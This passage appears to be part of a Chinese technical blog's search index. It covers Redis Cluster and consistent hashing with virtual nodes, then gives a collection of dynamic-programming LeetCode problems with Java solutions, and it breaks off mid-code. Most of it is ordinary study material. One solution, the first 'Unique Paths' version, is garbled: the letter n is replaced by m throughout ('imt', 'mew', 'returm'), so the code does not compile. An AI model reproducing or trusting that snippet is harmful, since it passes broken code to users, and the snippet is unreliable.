消息，消息中同样带有自己已知的两个节点信息。</li><li><strong>Fail</strong> 节点 ping 不通某节点后，会向集群所有节点广播该节点挂掉的消息。其他节点收到消息后标记已下线。</li></ul><p>由于去中心化和通信机制，Redis Cluster 选择了最终一致性和基本可用。</p><h2><span id="redis的集群原理">Redis的集群原理</span></h2><h2><span id="集群可用性">集群可用性</span></h2><p>如果集群任意master挂掉,且当前master没有slave.集群进入fail状态,也可以理解成集群的slot映射[0-16383]不完整时进入fail状态.。</p><h3><span id="如何从海量数据里快速找到所需">如何从海量数据里快速找到所需？</span></h3><p>Ø 分片：按照某种规则去划分数据，分散存储在多个节点上</p><p>Ø 常规的按照哈希划分无法实现节点的动态增减</p><h3><span id="一致性哈希算法对232取模将哈希值空间组织成虚拟的圆环">一致性哈希算法：对2^32取模，将哈希值空间组织成虚拟的圆环</span></h3><p><img src="image-20200325162559040.png" alt></p><p>顺时针递增</p><h3><span id="将数据key使用相同的函数hash计算出哈希值">将数据key使用相同的函数Hash计算出哈希值</span></h3><p><img src="image-20200325162616613.png" alt></p><p>使用服务器主机名或者ip地址哈希</p><p>对数据同样进行hash算法，确定位置，然后根据环顺时针行走，第一个遇到的服务器就是目标存储服务器。</p><p><img src="image-20200325162628890.png" alt></p><p>假设nodeC宕机，只有NodeB到nodeC之间的数据受影响，新来的数据都会沿顺时针存入nodeD，因此可以做到最小化有损服务。</p><h3><span id="新增服务器node-x">新增服务器Node X</span></h3><p><img src="image-20200325162654114.png" alt></p><p>受影响的数据也只是nodeX到NodeB之间的数据。</p><p>受影响的数据是新服务器到其环空间中前一台服务器之间的数据</p><h3><span id="hash环的数据倾斜问题">Hash环的数据倾斜问题</span></h3><p><img src="image-20200325162709515.png" alt></p><h3><span id="引入虚拟节点解决数据倾斜的问题">引入虚拟节点解决数据倾斜的问题</span></h3><p><img src="image-20200325162823050.png" alt></p><p>对每个节点都计算多个哈希，服务器ip或者主机名后面加编号实现</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划集合</title>
      <link href="/2020/03/25/dp/"/>
      <url>/2020/03/25/dp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘录了一些经典的动态规划题</p><a id="more"></a><!-- toc --><ul><li><a href="#基本dp问题">基本DP问题：</a><ul><li><a href="#70-climbing-stairs">70. Climbing Stairs √</a></li><li><a href="#120-triangle">120. Triangle √</a></li><li><a href="#53-maximum-subarray">53. Maximum Subarray √</a></li><li><a href="#303-range-sum-query-immutable">303. Range Sum Query - Immutable √</a></li><li><a href="#343-integer-break">343. Integer Break √</a></li></ul></li><li><a href="#矩形dp问题">矩形DP问题</a><ul><li><a href="#62-unique-paths">62. Unique Paths √</a></li><li><a href="#64-minimum-path-sum">64. Minimum Path Sum √</a></li><li><a href="#63-unique-paths-ii">63. Unique Paths II √</a></li><li><a href="#221-maximal-square-">221. Maximal Square -</a></li></ul></li><li><a href="#序列类动态规划问题">序列类动态规划问题</a><ul><li><a href="#300-longest-increasing-subsequence">300. Longest Increasing Subsequence √</a></li><li><a href="#leetcode-第-256-号问题粉刷房子">LeetCode 第 256 号问题：粉刷房子 √</a></li><li><a href="#198-house-robber">198. House Robber √</a></li><li><a href="#leetcode-第-265-号问题粉刷房子ii">LeetCode 第 265 号问题：粉刷房子II √</a></li><li><a href="#213-house-robber-ii">213. House Robber II √</a></li><li><a href="#413-arithmetic-slices">413. Arithmetic Slices √</a></li><li><a href="#279-perfect-squares">279. Perfect Squares √</a></li><li><a href="#91-decode-ways">91. Decode Ways ×</a></li></ul></li><li><a href="#双序列类动态规划字符匹配类">双序列类动态规划：字符匹配类</a><ul><li><a href="#1143-longest-common-subsequence-">1143. Longest Common Subsequence -</a></li><li><a href="#72-edit-distance">72. Edit Distance √</a></li><li><a href="#44-wildcard-matching-">44. Wildcard Matching -</a></li><li><a href="#10-regular-expression-matching">10. Regular Expression Matching ×</a></li><li><a href="#97-interleaving-string">97. Interleaving String ×</a></li></ul></li><li><a href="#概率dp问题">概率DP问题</a><ul><li><a href="#4-信件错排">4. 信件错排 ×</a></li><li><a href="#5-母牛生产">5. 母牛生产 √</a></li></ul></li><li><a href="#各种game集合">各种Game集合</a><ul><li><a href="#1025-divisor-game">1025. Divisor Game ×</a></li><li><a href="#877-stone-game">877. Stone Game</a></li></ul></li><li><a href="#股票问题状态机">股票问题（状态机）</a><ul><li><a href="#leetcode-121-best-time-to-buy-and-sell-stock">Leetcode 121 Best Time to Buy and Sell Stock √</a></li><li><a href="#leetcode-122-best-time-to-buy-and-sell-stock-ii">Leetcode 122 Best Time to Buy and Sell Stock II √</a></li><li><a href="#leetcode-123-best-time-to-buy-and-sell-stock-iii">Leetcode 123 Best Time to Buy and Sell Stock III √</a></li><li><a href="#leetcode-188-best-time-to-buy-and-sell-stock-iv">Leetcode 188 Best Time to Buy and Sell Stock IV ×</a></li><li><a href="#leetcode-309-best-time-to-buy-and-sell-stock-with-cooldown">Leetcode 309 Best Time to Buy and Sell Stock with Cooldown √</a></li><li><a href="#leetcode-714-best-time-to-buy-and-sell-stock-with-transcation-fee">Leetcode 714 Best Time to Buy and Sell Stock with Transcation Fee √</a></li></ul></li></ul><!-- tocstop --><h1><span id="基本dp问题">基本DP问题：</span></h1><h2><span id="70-climbing-stairs">70. Climbing Stairs √</span></h2><p>假设你正在爬楼梯。需要 <em>n</em> 阶你才能到达楼顶。</p><p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p><p>注意：给定 <em>n</em> 是一个正整数。</p><p><strong>示例</strong> <strong>1</strong>：</p><p> 输入：2<br> 输出：2<br> 解释： 有两种方法可以爬到楼顶。</p><ol><li>1 阶 + 1 阶</li><li>2 阶</li></ol><p><strong>示例</strong> <strong>2</strong>：</p><p> 输入：3<br> 输出：3<br> 解释： 有三种方法可以爬到楼顶。</p><ol><li>1 阶 + 1 阶 + 1 阶</li><li>1 阶 + 2 阶</li><li>2 阶 + 1 阶</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="120-triangle">120. Triangle √</span></h2><p>给定一个三角形，找出自顶向下的最小路径和。每一步只能移动到下一行中相邻的结点上。</p><p>例如，给定三角形：</p><p>[<br>     [2],<br>    [3,4],<br>   [6,5,7],<br>  [4,1,8,3]<br> ]</p><p>自顶向下的最小路径和为 11（即，2 + 3 + 5 + 1 = 11）。</p><p><strong>说明：</strong></p><p>如果你可以只使用 O(n) 的额外空间（n 为三角形的总行数）来解决这个问题，那么你的算法会很加分。</p><p>二维dp解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[][]dp;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> len = triangle.size();</span><br><span class="line">        dp = <span class="keyword">new</span> <span class="keyword">int</span>[len][len];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">           dp[len-<span class="number">1</span>][i] = triangle.get(len-<span class="number">1</span>).get(i);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=len-<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">               dp[i][j]=triangle.get(i).get(j)+Math.min(dp[i+<span class="number">1</span>][j],dp[i+<span class="number">1</span>][j+<span class="number">1</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如何降维打击呢？如果看过背包问题就不难回答了。dp[i][j]&lt;—dp[i+1][j] , dp[i+1][j+1]。</p><p>因此正序遍历的话只会改变dp[i]的值，对dp[i+1]的值没有任何影响，所以我们降维打击应该采取正向遍历。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = triangle.get(triangle.size()-<span class="number">1</span>).size();</span><br><span class="line">        <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            dp[i]=triangle.get(len-<span class="number">1</span>).get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=len-<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;triangle.get(i).size();j++)</span><br><span class="line">                dp[j]=Math.min(dp[j],dp[j+<span class="number">1</span>])+triangle.get(i).get(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="53-maximum-subarray">53. Maximum Subarray √</span></h2><p>给定一个整数数组 <em>nums</em> ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p><p><strong>示例</strong>:</p><p>输入: [-2,1,-3,4,-1,2,1,-5,4],<br> 输出: 6<br> 解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p><p>**进阶:</p><p>如果你已经实现复杂度为 O(n) 的解法，尝试使用更为精妙的分治法求解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="keyword">null</span>||nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">        <span class="keyword">int</span> res=nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            dp[i]=nums[i]&gt;nums[i]+dp[i-<span class="number">1</span>]?nums[i]:nums[i]+dp[i-<span class="number">1</span>];</span><br><span class="line">            res=Math.max(dp[i],res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实可以多开1个空间去优化代码长度：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> res = Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=nums.length;i++)&#123;</span><br><span class="line">        dp[i]=Math.max(dp[i-<span class="number">1</span>]+nums[i-<span class="number">1</span>],nums[i-<span class="number">1</span>]);</span><br><span class="line">        res = res&lt;dp[i]?dp[i]:res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到dp[i]其实依赖只于dp[i-1]，因此我们只需要两个变量足以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> curMax = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> max = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            curMax = Math.max(nums[i],nums[i]+curMax);</span><br><span class="line">            max = Math.max(max,curMax);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="303-range-sum-query-immutable">303. Range Sum Query - Immutable √</span></h2><p>Given an integer array <em>nums</em>, find the sum of the elements between indices <em>i</em> and <em>j</em> (<em>i</em> ≤ <em>j</em>), inclusive.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given nums &#x3D; [-2, 0, 3, -5, 2, -1]</span><br><span class="line"></span><br><span class="line">sumRange(0, 2) -&gt; 1</span><br><span class="line">sumRange(2, 5) -&gt; -1</span><br><span class="line">sumRange(0, 5) -&gt; -3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] res;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NumArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    res = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    <span class="keyword">int</span> rec=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">        rec+=i;</span><br><span class="line">        res[j]=rec;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumRange</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res[j]- (i-<span class="number">1</span>&gt;=<span class="number">0</span>?res[i-<span class="number">1</span>]:<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="343-integer-break">343. Integer Break √</span></h2><p>Given a positive integer <em>n</em>, break it into the sum of <strong>at least</strong> two positive integers and maximize the product of those integers. Return the maximum product you can get.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: 2 &#x3D; 1 + 1, 1 × 1 &#x3D; 1.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 10</span><br><span class="line">Output: 36</span><br><span class="line">Explanation: 10 &#x3D; 3 + 3 + 4, 3 × 3 × 4 &#x3D; 36.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[]=<span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;i;j++)&#123;</span><br><span class="line">            dp[i]=Math.max(Math.max((i-j)*dp[j],(i-j)*j),dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="矩形dp问题">矩形DP问题</span></h1><h2><span id="62-unique-paths">62. Unique Paths √</span></h2><p>一个机器人位于一个 <em>m x n</em> 网格的左上角 （起始点在下图中标记为“Start” ）。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。</p><p>问总共有多少条不同的路径？</p><p><img src="clip_image001.png" alt><br> Above is a 7 x 3 grid. How many possible unique paths are there?</p><p>例如，上图是一个7 x 3 的网格。有多少可能的路径？</p><p><strong>说明：</strong> <em>m</em> 和 <em>n</em> 的值均不超过 100。</p><p><strong>示例</strong> <strong>1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入: m &#x3D; 3, n &#x3D; 2</span><br><span class="line">输出: 3</span><br><span class="line">解释:</span><br><span class="line">从左上角开始，总共有 3 条路径可以到达右下角。</span><br><span class="line"></span><br><span class="line">1. 向右 -&gt; 向右 -&gt; 向下</span><br><span class="line">2. 向右 -&gt; 向下 -&gt; 向右</span><br><span class="line">3. 向下 -&gt; 向右 -&gt; 向右</span><br></pre></td></tr></table></figure><p><strong>示例</strong> <strong>2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: m &#x3D; 7, n &#x3D; 3</span><br><span class="line">输出: 28</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> imt <span class="title">umiquePaths</span><span class="params">(imt m, imt n)</span> </span>&#123;</span><br><span class="line">    imt[][] dp = mew imt[n][m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (imt i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (imt j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (imt i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (imt j = <span class="number">1</span>; j &lt; m; ++j) &#123;</span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    returm dp[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>降维打击：</p><p>还是分析一下dp[i][j]依赖于dp[i][j]当前行的左边元素和dp[i-1][j]上一行的元素，因此应该选择正序遍历以实时获得当前行左边元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[m];</span><br><span class="line">        Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;m;j++)&#123;</span><br><span class="line">                dp[j]=dp[j]+dp[j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="64-minimum-path-sum">64. Minimum Path Sum √</span></h2><p>Given a <em>m</em> x <em>n</em> grid filled with non-negative numbers, find a path from top left to bottom right which <em>minimizes</em> the sum of all numbers along its path.</p><p><strong>Note:</strong> You can only move either down or right at any point in time.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [1,3,1],</span><br><span class="line">  [1,5,1],</span><br><span class="line">  [4,2,1]</span><br><span class="line">]</span><br><span class="line">Output: 7</span><br><span class="line">Explanation: Because the path 1→3→1→1→1 minimizes the sum.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(grid.length==<span class="number">0</span>||grid[<span class="number">0</span>].length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m=grid.length,n=grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">    Arrays.fill(dp[<span class="number">0</span>],Integer.MAX_VALUE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=m;i++) dp[i][<span class="number">0</span>]=Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            dp[i][j]=grid[i-<span class="number">1</span>][j-<span class="number">1</span>]+Math.min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="63-unique-paths-ii">63. Unique Paths II √</span></h2><p>一个机器人位于一个 <em>m x n</em> 网格的左上角 （起始点在下图中标记为“Start” ）。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。</p><p><strong>现在考虑网格中有障碍物</strong>。那么从左上角到右下角将会有多少条不同的路径？</p><p><img src="dp/clip_image001-1585104415889.png" alt="https://assets.leetcode.com/uploads/2018/10/22/robot_maze.png"></p><p>网格中的障碍物和空位置分别用 1 和 0 来表示。</p><p>说明：m 和 n 的值均不超过 100。</p><p><strong>示例</strong> <strong>1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [0,0,0],</span><br><span class="line">  [0,1,0],</span><br><span class="line">  [0,0,0]</span><br><span class="line">]</span><br><span class="line">输出: 2</span><br><span class="line">解释:</span><br><span class="line">3x3 网格的正中间有一个障碍物。</span><br><span class="line">从左上角到右下角一共有 2 条不同的路径：</span><br><span class="line"></span><br><span class="line">1. 向右 -&gt; 向右 -&gt; 向下 -&gt; 向下</span><br><span class="line">2. 向下 -&gt; 向下 -&gt; 向右 -&gt; 向右</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span 